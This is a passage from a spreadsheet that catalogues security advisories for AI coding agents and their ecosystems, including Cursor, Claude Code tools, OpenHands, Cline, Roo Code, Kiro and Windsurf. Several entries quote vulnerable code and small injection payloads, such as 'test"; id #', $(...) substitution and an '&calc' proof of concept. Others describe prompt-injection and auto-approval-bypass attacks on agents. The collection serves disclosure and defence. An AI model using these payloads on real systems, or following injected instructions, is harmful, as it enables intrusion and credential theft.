        <is>
          <t>CA-091</t>
        </is>
      </c>
      <c r="B105" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C105" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D105" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E105" s="8" t="inlineStr">
        <is>
          <t>2026-03-11</t>
        </is>
      </c>
      <c r="F105" s="9" t="inlineStr">
        <is>
          <t>Cursor Affected by Arbitrary Code Execution via  Prompt Injection and Whitelist Bypass</t>
        </is>
      </c>
      <c r="G105" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 2.0 ,if a visited website contains maliciously crafted instructions, the model may attempt to follow them in order to “assist” the user. When combined with a bypass of the command whitelist mechanism, such indirect prompt injections could result in commands being executed automatically, without the user’s explicit intent, thereby posing a significant security risk. This vulnerability is fixed in 2.0.</t>
        </is>
      </c>
      <c r="H105" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-31854</t>
        </is>
      </c>
    </row>
    <row r="106">
      <c r="A106" s="8" t="inlineStr">
        <is>
          <t>CA-092</t>
        </is>
      </c>
      <c r="B106" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C106" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D106" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E106" s="8" t="inlineStr">
        <is>
          <t>2026-03-11</t>
        </is>
      </c>
      <c r="F106" s="9" t="inlineStr">
        <is>
          <t>@siteboon/claude-code-ui is Vulnerable to Command Injection via Multiple Parameters</t>
        </is>
      </c>
      <c r="G106" s="9" t="inlineStr">
        <is>
          <t xml:space="preserve">### Summary Multiple Git-related API endpoints use execAsync() with string interpolation of user-controlled parameters (file, branch, message, commit), allowing authenticated attackers to execute arbitrary OS commands.  ### Details The claudecodeui application provides Git integration through various API endpoints. These endpoints accept user-controlled parameters such as file paths, branch names, commit messages, and commit hashes, which are directly interpolated into shell command strings passed to execAsync().  The application attempts to escape double quotes in some parameters, but this protection is trivially bypassable using other shell metacharacters such as:  Command substitution: $(command) or \`command\` Command chaining: ;, &amp;&amp;, || Newlines and other control characters  ### Affected Endpoints `GET /api/git/diff - file parameter` `GET /api/git/status - file parameter` `POST /api/git/commit - files array and message parameter` `POST /api/git/checkout - branch parameter` `POST /api/git/create-branch - branch parameter` `GET /api/git/commits - commit hash parameter` `GET /api/git/commit-diff - commit parameter`  ### Vulnerable Code  File: server/routes/git.js ``` // Line 205 - git status with file parameter const { stdout: statusOutput } = await execAsync(   `git status --porcelain "${file}"`,  // INJECTION via file   { cwd: projectPath } ); ``` ``` // Lines 375-379 - git commit with files array and message for (const file of files) {   await execAsync(`git add "${file}"`, { cwd: projectPath });  // INJECTION via files[] } const { stdout } = await execAsync(   `git commit -m "${message.replace(/"/g, '\\"')}"`,  // INJECTION via message (bypass with $())   { cwd: projectPath } ); ``` ``` // Lines 541-543 - git show with commit parameter (no quotes!) const { stdout } = await execAsync(   `git show ${commit}`,  // INJECTION via commit   { cwd: projectPath } ); ```  ### Impact - Remote Code Execution as the Node.js process user - Full server compromise - Data exfiltration - Supply chain attacks - modify committed code to inject malware  ---  ### Fix  **Commit:** siteboon/claudecodeui@55567f4  #### Root cause remediation  All vulnerable `execAsync()` calls have been replaced with the existing `spawnAsync()` helper (which uses `child_process.spawn` with `shell: false`). Arguments are passed as an array directly to the OS — shell metacharacters in user input are inert.  **Endpoints patched in `server/routes/git.js`:**  - `GET /api/git/diff` — `file` (4 calls) - `GET /api/git/file-with-diff` — `file` (3 calls) - `POST /api/git/commit` — `files[]`, `message` - `POST /api/git/checkout` — `branch` - `POST /api/git/create-branch` — `branch` - `GET /api/git/commits` — `commit.hash` - `GET /api/git/commit-diff` — `commit` - `POST /api/git/generate-commit-message` — `file` - `POST /api/git/discard` — `file` (3 calls) - `POST /api/git/delete-untracked` — `file` - `POST /api/git/publish` — `branch`  A strict allowlist regex (`/^[0-9a-f]{4,64}$/i`) was also </t>
        </is>
      </c>
      <c r="H106" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-f2fc-vc88-6w7q</t>
        </is>
      </c>
    </row>
    <row r="107">
      <c r="A107" s="8" t="inlineStr">
        <is>
          <t>CA-093</t>
        </is>
      </c>
      <c r="B107" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C107" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D107" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E107" s="8" t="inlineStr">
        <is>
          <t>2026-03-11</t>
        </is>
      </c>
      <c r="F107" s="9" t="inlineStr">
        <is>
          <t>@siteboon/claude-code-ui Vulnerable to Unauthenticated RCE via WebSocket Shell Injection</t>
        </is>
      </c>
      <c r="G107" s="9" t="inlineStr">
        <is>
          <t># Security Advisory: Insecure Default JWT Secret + WebSocket Auth Bypass Enables Unauthenticated RCE via Shell Injection Download: [cve_claudecodeui_submission_v2.zip](https://github.com/user-attachments/files/25686652/cve_claudecodeui_submission_v2.zip)  ##  Submission Info  | Field | Value | |-------|-------| | **Package** | `@siteboon/claude-code-ui` | | **Ecosystem** | npm | | **Affected versions** | `&lt;= 1.24.0` (latest) | | **Severity** | Critical | | **CVSS Score** | 9.8 | | **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | | **CWE** | CWE-1188, CWE-287, CWE-78 | | **Reported** | 2026-03-02 | | **Researcher** | Ethan-Yang (OPCIA) |  ---  ## Summary  Three chained vulnerabilities allow **unauthenticated remote code execution** on any claudecodeui instance running with default configuration. No account, credentials, or prior access is required.  The root cause of RCE is **OS command injection (CWE-78)** in the WebSocket shell handler. Authentication is bypassed by combining an insecure default JWT secret **(CWE-1188)** with a WebSocket authentication function that skips database user validation **(CWE-287)**.  ---  ## Vulnerability Details  ### 1. Insecure Default JWT Secret — `CWE-1188`  **File**: `server/middleware/auth.js`, line 6  ```javascript const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production'; ```  The server uses an environment variable for `JWT_SECRET`, but falls back to a well-known default value when the variable is not set. Critically, `JWT_SECRET` is **not included in `.env.example`**, so the majority of users deploy without setting it, leaving the fallback value in effect.  Since this default string is published verbatim in the public source code, any attacker can use it to sign arbitrary JWT tokens.  ---  ### 2. WebSocket Authentication Skips Database Validation — `CWE-287`  **File**: `server/middleware/auth.js`, lines 82–108  `authenticateWebSocket()` only verifies the JWT **signature**. It does **not** check whether the `userId` in the payload actually exists in the database — unlike `authenticateToken()` which is used for REST endpoints and does perform this check:  ```javascript // authenticateWebSocket() — VULNERABLE const decoded = jwt.verify(token, JWT_SECRET); return decoded;  // ← userId never verified against DB  // authenticateToken() — CORRECT (REST endpoints) const decoded = jwt.verify(token, JWT_SECRET); const user = userDb.getUserById(decoded.userId);  // ← DB check present if (!user) return res.status(401)... ```  A forged token with a non-existent `userId` passes WebSocket authentication, bypassing access control entirely.  ---  ### 3. OS Command Injection via WebSocket Shell — `CWE-78`  **File**: `server/index.js`, line 1179  ```javascript  shellCommand = `cd "${projectPath}" &amp;&amp; ${initialCommand}`; ```  Both `projectPath` and `initialCommand` are taken directly from the WebSocket message payload and interpolated into a bash command string without any sanit</t>
        </is>
      </c>
      <c r="H107" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-gv8f-wpm2-m5wr</t>
        </is>
      </c>
    </row>
    <row r="108">
      <c r="A108" s="8" t="inlineStr">
        <is>
          <t>CA-094</t>
        </is>
      </c>
      <c r="B108" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C108" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D108" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E108" s="8" t="inlineStr">
        <is>
          <t>2026-03-17</t>
        </is>
      </c>
      <c r="F108" s="9" t="n"/>
      <c r="G108" s="9" t="inlineStr">
        <is>
          <t>Improper trust boundary enforcement in Kiro IDE before version 0.8.0 on all supported platforms might allow a remote unauthenticated threat actor to execute arbitrary code via maliciously crafted project directory files that bypass workspace trust protections when a local user opens the directory.    To remediate this issue, users should upgrade to version 0.8.0 or higher.</t>
        </is>
      </c>
      <c r="H108" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-qpcc-2ccj-gp68</t>
        </is>
      </c>
    </row>
    <row r="109">
      <c r="A109" s="8" t="inlineStr">
        <is>
          <t>CA-095</t>
        </is>
      </c>
      <c r="B109" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C109" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D109" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E109" s="8" t="inlineStr">
        <is>
          <t>2026-03-19</t>
        </is>
      </c>
      <c r="F109" s="9" t="inlineStr">
        <is>
          <t>Claude Code has a Workspace Trust Dialog Bypass via Repo-Controlled Settings File</t>
        </is>
      </c>
      <c r="G109" s="9" t="inlineStr">
        <is>
          <t>Claude Code resolved the permission mode from settings files, including the repo-controlled `.claude/settings.json`, before determining whether to display the workspace trust confirmation dialog. A malicious repository could set `permissions.defaultMode` to `bypassPermissions` in its committed `.claude/settings.json`, causing the trust dialog to be silently skipped on first open. This allowed a user to be placed into a permissive mode without seeing the trust confirmation prompt, making it easier for an attacker-controlled repository to gain tool execution without explicit user consent.  Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/cantina_xyz for reporting this issue.</t>
        </is>
      </c>
      <c r="H109" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-mmgp-wc2j-qcv7</t>
        </is>
      </c>
    </row>
    <row r="110">
      <c r="A110" s="8" t="inlineStr">
        <is>
          <t>CA-096</t>
        </is>
      </c>
      <c r="B110" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C110" s="8" t="inlineStr">
        <is>
          <t>OpenHands</t>
        </is>
      </c>
      <c r="D110" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E110" s="8" t="inlineStr">
        <is>
          <t>2026-03-25</t>
        </is>
      </c>
      <c r="F110" s="9" t="inlineStr">
        <is>
          <t>OpenHands is Vulnerable to Command Injection through its Git Diff Handler</t>
        </is>
      </c>
      <c r="G110" s="9" t="inlineStr">
        <is>
          <t>## Summary  A Command Injection vulnerability exists in the `get_git_diff()` method at `openhands/runtime/utils/git_handler.py:134`. The `path` parameter from the `/api/conversations/{conversation_id}/git/diff` API endpoint is passed unsanitized to a shell command, allowing authenticated attackers to execute arbitrary commands in the agent sandbox. The user is already allowed to instruct the agent to execute commands, but this bypasses the normal channels.  ---  ## Details  ### Vulnerable Code Path  The vulnerability flows through these files:  1. **API Endpoint** (`openhands/server/routes/files.py:267-277`) ```python @app.get('/git/diff') async def git_diff(     path: str,  # &lt;-- User input from HTTP request     ... ):     ...     diff = await call_sync_from_async(runtime.get_git_diff, path, cwd)  # No sanitization ```  2. **Runtime** (`openhands/runtime/base.py:1231-1233`) ```python def get_git_diff(self, file_path: str, cwd: str) -&gt; dict[str, str]:     self.git_handler.set_cwd(cwd)     return self.git_handler.get_git_diff(file_path)  # Passed directly ```  3. **Vulnerable Method** (`openhands/runtime/utils/git_handler.py:10-12, 134`) ```python # Command template with placeholder GIT_DIFF_CMD = 'python3 /openhands/code/openhands/runtime/utils/git_diff.py "{file_path}"'  # Line 134 - VULNERABLE: User input directly interpolated result = self.execute(self.git_diff_cmd.format(file_path=file_path), self.cwd) ```  4. **Shell Execution** (`openhands/runtime/utils/git_diff.py:25-27`) ```python def run(cmd: str, cwd: str) -&gt; str:     result = subprocess.run(         args=cmd,         shell=True,  # &lt;-- Enables shell metacharacter interpretation         stdout=subprocess.PIPE,         stderr=subprocess.PIPE,         cwd=cwd     ) ```  ### Root Cause  The `file_path` parameter is directly interpolated into a shell command string using Python's `.format()` method without any sanitization. When this command is executed with `shell=True`, shell metacharacters like `"`, `;`, and `#` are interpreted, allowing command injection.  **Example:** - Input: `test"; id #` - Constructed command: `python3 /script.py "test"; id #"` - Shell interprets as two commands: `python3 /script.py "test"` AND `id`  ---  ## Impact  ### Who is Affected - All OpenHands deployments exposing the `/api/conversations/{id}/git/diff` endpoint - Any authenticated user can exploit this vulnerability,   ### Attack Capabilities An attacker can: 1. **Execute arbitrary commands** on the runtime container as root 2. **Read sensitive files** including `.env`, API keys, source code 3. **Write arbitrary files** to inject malicious code 4. **Establish reverse shells** for persistent access 5. **Potentially escape the container** if Docker is misconfigured  ## Mitigation   Users should update to the latest version of OpenHands that includes the changes from PR #13051. The fix replaces direct shell string formatting with proper argument array handling or rigorous path sanitization to prevent command ch</t>
        </is>
      </c>
      <c r="H110" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7h8w-hj9j-8rjw</t>
        </is>
      </c>
    </row>
    <row r="111">
      <c r="A111" s="8" t="inlineStr">
        <is>
          <t>CA-097</t>
        </is>
      </c>
      <c r="B111" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C111" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D111" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E111" s="8" t="inlineStr">
        <is>
          <t>2026-03-30</t>
        </is>
      </c>
      <c r="F111" s="9" t="n"/>
      <c r="G111" s="9" t="inlineStr">
        <is>
          <t>Roo Code's command auto-approval module contains a critical OS command injection vulnerability that renders its whitelist security mechanism completely ineffective. The system relies on fragile regular expressions to parse command structures; while it attempts to intercept dangerous operations, it fails to account for standard Shell command substitution Roo Code (specifically$(...)and backticks ...). An attacker can construct a command such as git log --grep="$(malicious_command)", forcing Syntx to misidentify it as a safe git operation and automatically approve it. The underlying Shell prioritizes the execution of the malicious code injected within the arguments, resulting in Remote Code Execution without any user interaction.</t>
        </is>
      </c>
      <c r="H111" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3hqq-48gq-cwg4</t>
        </is>
      </c>
    </row>
    <row r="112">
      <c r="A112" s="8" t="inlineStr">
        <is>
          <t>CA-098</t>
        </is>
      </c>
      <c r="B112" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C112" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D112" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E112" s="8" t="inlineStr">
        <is>
          <t>2026-03-30</t>
        </is>
      </c>
      <c r="F112" s="9" t="n"/>
      <c r="G112" s="9" t="inlineStr">
        <is>
          <t>DSAI-Cline's command auto-approval module contains a critical OS command injection vulnerability that renders its whitelist security mechanism completely ineffective. The system relies on string-based parsing to validate commands; while it intercepts dangerous operators such as ;, &amp;&amp;, ||, |, and command substitution patterns, it fails to account for raw newline characters embedded within the input. An attacker can construct a payload by embedding a literal newline between a whitelisted command and malicious code (e.g., git log malicious_command), forcing DSAI-Cline to misidentify it as a safe operation and automatically approve it. The underlying PowerShell interpreter treats the newline as a command separator, executing both commands sequentially, resulting in Remote Code Execution without any user interaction.</t>
        </is>
      </c>
      <c r="H112" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-rfcm-98h7-2567</t>
        </is>
      </c>
    </row>
    <row r="113">
      <c r="A113" s="8" t="inlineStr">
        <is>
          <t>CA-099</t>
        </is>
      </c>
      <c r="B113" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C113" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D113" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E113" s="8" t="inlineStr">
        <is>
          <t>2026-03-31</t>
        </is>
      </c>
      <c r="F113" s="9" t="inlineStr">
        <is>
          <t>FastMCP has a Command Injection vulnerability - Gemini CLI</t>
        </is>
      </c>
      <c r="G113" s="9" t="inlineStr">
        <is>
          <t>Server names containing shell metacharacters (e.g., `&amp;`) can cause command injection on Windows when passed to `fastmcp install claude-code` or `fastmcp install gemini-cli`. These install paths use `subprocess.run()` with a list argument, but on Windows the target CLIs often resolve to `.cmd` wrappers that are executed through `cmd.exe`, which interprets metacharacters in the flattened command string.  PoC: ```python from fastmcp import FastMCP  mcp = FastMCP(name="test&amp;calc")  @mcp.tool def roll_dice(n_dice: int) -&gt; list[int]:     """Roll `n_dice` 6-sided dice and return the results."""     return [random.randint(1, 6) for _ in range(n_dice)] ```  ``` fastmcp install claude-code server.py   # or: fastmcp install gemini-cli server.py ```  On Windows, this opens Calculator via the `&amp;calc` in the server name.  Impact: Arbitrary command execution with the privileges of the user running `fastmcp install`. Affects Windows hosts where the target CLI (one of claude, gemini) is installed as a `.cmd` wrapper. Does not affect macOS/Linux, and does not affect config-file-based install targets (cursor, goose, mcp-json).  Patched in #3522 by validating server names to reject shell metacharacters.</t>
        </is>
      </c>
      <c r="H113" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-m8x7-r2rg-vh5g</t>
        </is>
      </c>
    </row>
    <row r="114">
      <c r="A114" s="8" t="inlineStr">
        <is>
          <t>CA-100</t>
        </is>
      </c>
      <c r="B114" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C114" s="8" t="inlineStr">
        <is>
          <t>Cline</t>
        </is>
      </c>
      <c r="D114" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E114" s="8" t="inlineStr">
        <is>
          <t>2026-03-31</t>
        </is>
      </c>
      <c r="F114" s="9" t="n"/>
      <c r="G114" s="9" t="inlineStr">
        <is>
          <t>DSAI-Cline's command auto-approval module contains a critical OS command injection vulnerability that renders its whitelist security mechanism completely ineffective. The system relies on string-based parsing to validate commands; while it intercepts dangerous operators such as ;, &amp;&amp;, ||, |, and command substitution patterns, it fails to account for raw newline characters embedded within the input. An attacker can construct a payload by embedding a literal newline between a whitelisted command and malicious code (e.g., git log malicious_command), forcing DSAI-Cline to misidentify it as a safe operation and automatically approve it. The underlying PowerShell interpreter treats the newline as a command separator, executing both commands sequentially, resulting in Remote Code Execution without any user interaction.</t>
        </is>
      </c>
      <c r="H114" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-w4rv-fppc-w84h</t>
        </is>
      </c>
    </row>
    <row r="115">
      <c r="A115" s="8" t="inlineStr">
        <is>
          <t>CA-101</t>
        </is>
      </c>
      <c r="B115" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C115" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D115" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E115" s="8" t="inlineStr">
        <is>
          <t>2026-04-02</t>
        </is>
      </c>
      <c r="F115" s="9" t="n"/>
      <c r="G115" s="9" t="inlineStr">
        <is>
          <t>Unsanitized input during web page generation in the Kiro Agent webview in Kiro IDE before version 0.8.140 allows a remote unauthenticated threat actor to execute arbitrary code via a potentially damaging crafted color theme name when a local user opens the workspace. This issue requires the user to trust the workspace when prompted.  To remediate this issue, users should upgrade to version 0.8.140.</t>
        </is>
      </c>
      <c r="H115" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7v7j-vpv5-h468</t>
        </is>
      </c>
    </row>
    <row r="116">
      <c r="A116" s="8" t="inlineStr">
        <is>
          <t>CA-102</t>
        </is>
      </c>
      <c r="B116" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C116" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D116" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E116" s="8" t="inlineStr">
        <is>
          <t>2026-04-06</t>
        </is>
      </c>
      <c r="F116" s="9" t="n"/>
      <c r="G116" s="9" t="inlineStr">
        <is>
          <t>Anthropic Claude Code CLI and Claude Agent SDK contain an OS command injection vulnerability in the command lookup helper and deep-link terminal launcher that allows local attackers to execute arbitrary commands by manipulating the TERMINAL environment variable. Attackers can inject shell metacharacters into the TERMINAL variable which are interpreted by /bin/sh when the command lookup helper constructs and executes shell commands with shell=true. The vulnerability can be triggered during normal CLI execution as well as via the deep-link handler path, resulting in arbitrary command execution with the privileges of the user running the CLI.</t>
        </is>
      </c>
      <c r="H116" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-jgg3-qqhf-7rx7</t>
        </is>
      </c>
    </row>
    <row r="117">
      <c r="A117" s="8" t="inlineStr">
        <is>
          <t>CA-103</t>
        </is>
      </c>
      <c r="B117" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C117" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D117" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E117" s="8" t="inlineStr">
        <is>
          <t>2026-04-06</t>
        </is>
      </c>
      <c r="F117" s="9" t="n"/>
      <c r="G117" s="9" t="inlineStr">
        <is>
          <t>Anthropic Claude Code CLI and Claude Agent SDK contain an OS command injection vulnerability in the prompt editor invocation utility that allows attackers to execute arbitrary commands by crafting malicious file paths. Attackers can inject shell metacharacters such as $() or backtick expressions into file paths that are interpolated into shell commands executed via execSync. Although the file path is wrapped in double quotes, POSIX shell semantics (POSIX §2.2.3) do not prevent command substitution within double quotes, allowing injected expressions to be evaluated and resulting in arbitrary command execution with the privileges of the user running the CLI.</t>
        </is>
      </c>
      <c r="H117" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-72p2-f44p-v65f</t>
        </is>
      </c>
    </row>
    <row r="118">
      <c r="A118" s="8" t="inlineStr">
        <is>
          <t>CA-104</t>
        </is>
      </c>
      <c r="B118" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C118" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D118" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E118" s="8" t="inlineStr">
        <is>
          <t>2026-04-06</t>
        </is>
      </c>
      <c r="F118" s="9" t="n"/>
      <c r="G118" s="9" t="inlineStr">
        <is>
          <t>Anthropic Claude Code CLI and Claude Agent SDK contain an OS command injection vulnerability in authentication helper execution where helper configuration values are executed using shell=true without input validation. Attackers who can influence authentication settings can inject shell metacharacters through parameters like apiKeyHelper, awsAuthRefresh, awsCredentialExport, and gcpAuthRefresh to execute arbitrary commands with the privileges of the user or automation environment, enabling credential theft and environment variable exfiltration.</t>
        </is>
      </c>
      <c r="H118" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-479q-mw77-pmr5</t>
        </is>
      </c>
    </row>
    <row r="119">
      <c r="A119" s="8" t="inlineStr">
        <is>
          <t>CA-105</t>
        </is>
      </c>
      <c r="B119" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C119" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D119" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E119" s="8" t="inlineStr">
        <is>
          <t>2026-04-08</t>
        </is>
      </c>
      <c r="F119" s="9" t="inlineStr">
        <is>
          <t>openclaw-claude-bridge: sandbox is not effective - `--allowed-tools ""` does not restrict available tools</t>
        </is>
      </c>
      <c r="G119" s="9" t="inlineStr">
        <is>
          <t>## Affected  openclaw-claude-bridge v1.1.0  ## Issue  v1.1.0 spawns the Claude Code CLI subprocess with `--allowed-tools ""` and the release notes + README claim this **"disables all CLI tools"** for sandboxing. This claim is incorrect.  Per the Claude Code CLI documentation, `--allowed-tools` (alias `--allowedTools`) is an **auto-approve allowlist** of tools that execute without permission prompts — NOT a restriction on which tools are available. The correct flag to restrict the available tool set is `--tools`:  &gt; `--tools &lt;tools...&gt;`  Specify the list of available tools from the built-in set. **Use `""` to disable all tools**, `"default"` to use all tools, or specify tool names (e.g. `"Bash,Edit,Read"`).  ## Impact  - All CLI tools (Read/Write/Bash/WebFetch/...) remain nominally available to the spawned subprocess. - Actual execution behavior in `--print` non-interactive mode depends on undocumented CLI defaults (may auto-deny, may error out, may hang). - Users who deploy the bridge behind any interface that forwards untrusted prompts (e.g., publicly exposed OpenClaw gateway, automated pipelines with web-fetched context, agents that consume tool results from other systems) may be relying on a sandbox that does not exist.  The README explicitly makes a security claim the code does not uphold, creating a false sense of safety for downstream operators. If the underlying CLI behavior changes in a future version to auto-allow tools in `--print` mode, prompt-injection attacks could trigger arbitrary Read/Write/Bash operations in the gateway's process context.  ## Patches  Fixed in [v1.1.1](https://github.com/SeaL773/openclaw-claude-bridge/releases/tag/v1.1.1) (commit 8a296f5) by switching to `--tools ""`. The environment variable was also renamed from `CLAUDE_ALLOWED_TOOLS` to `CLAUDE_TOOLS` to match the flag.  ## Workarounds  Setting `CLAUDE_ALLOWED_TOOLS` on v1.1.0 has no mitigating effect. Upgrade to v1.1.1 or manually edit `dist/cli-bridge.js` to replace `--allowed-tools` with `--tools`.  ## References  - Fix: https://github.com/SeaL773/openclaw-claude-bridge/commit/8a296f5 - v1.1.1 notes: https://github.com/SeaL773/openclaw-claude-bridge/releases/tag/v1.1.1 - Claude Code CLI reference: https://docs.claude.com/en/docs/claude-code/cli-reference  ## Credit  Found during a second-round code review.</t>
        </is>
      </c>
      <c r="H119" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7853-gqqm-vcwx</t>
        </is>
      </c>
    </row>
    <row r="120">
      <c r="A120" s="8" t="inlineStr">
        <is>
          <t>CA-106</t>
        </is>
      </c>
      <c r="B120" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C120" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D120" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E120" s="8" t="inlineStr">
        <is>
          <t>2026-04-14</t>
        </is>
      </c>
      <c r="F120" s="9" t="inlineStr">
        <is>
          <t>OpenAI Codex CLI enables code execution through malicious MCP (Model Context Protocol) configuration files</t>
        </is>
      </c>
      <c r="G120" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was identified in OpenAI Codex CLI v0.23.0 and before that enables code execution through malicious MCP (Model Context Protocol) configuration files. The attack is triggered when a user runs the codex command inside a malicious or compromised repository. Codex automatically loads project-local .env and .codex/config.toml files without requiring user confirmation, allowing attackers to embed arbitrary commands that execute immediately.</t>
        </is>
      </c>
      <c r="H120" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-xrxf-jgv3-qmrm</t>
        </is>
      </c>
    </row>
    <row r="121">
      <c r="A121" s="8" t="inlineStr">
        <is>
          <t>CA-107</t>
        </is>
      </c>
      <c r="B121" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C121" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D121" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E121" s="8" t="inlineStr">
        <is>
          <t>2026-04-14</t>
        </is>
      </c>
      <c r="F121" s="9" t="n"/>
      <c r="G121" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio Code allows an authorized attacker to disclose information over a network.</t>
        </is>
      </c>
      <c r="H121" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-ghqv-73vw-x3j9</t>
        </is>
      </c>
    </row>
    <row r="122">
      <c r="A122" s="8" t="inlineStr">
        <is>
          <t>CA-108</t>
        </is>
      </c>
      <c r="B122" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C122" s="8" t="inlineStr">
        <is>
          <t>Windsurf/Codeium</t>
        </is>
      </c>
      <c r="D122" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E122" s="8" t="inlineStr">
        <is>
          <t>2026-04-15</t>
        </is>
      </c>
      <c r="F122" s="9" t="n"/>
      <c r="G122" s="9" t="inlineStr">
        <is>
          <t>A prompt injection vulnerability in Windsurf 1.9544.26 allows remote attackers to execute arbitrary commands on a victim system. When Windsurf processes attacker-controlled HTML content, malicious instructions can cause unauthorized modification of the local MCP configuration and automatic registration of a malicious MCP STDIO server, resulting in execution of arbitrary commands without further user interaction. Successful exploitation may allow attackers to execute commands on behalf of the user, persist malicious MCP configuration changes, and access sensitive information exposed through the application.</t>
        </is>
      </c>
      <c r="H122" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-wj2m-jvpr-64cq</t>
        </is>
      </c>
    </row>
    <row r="123">
      <c r="A123" s="8" t="inlineStr">
        <is>
          <t>CA-109</t>
        </is>
      </c>
      <c r="B123" s="8" t="inlineStr">
        <is>
          <t>W4</t>
        </is>
      </c>
      <c r="C123" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
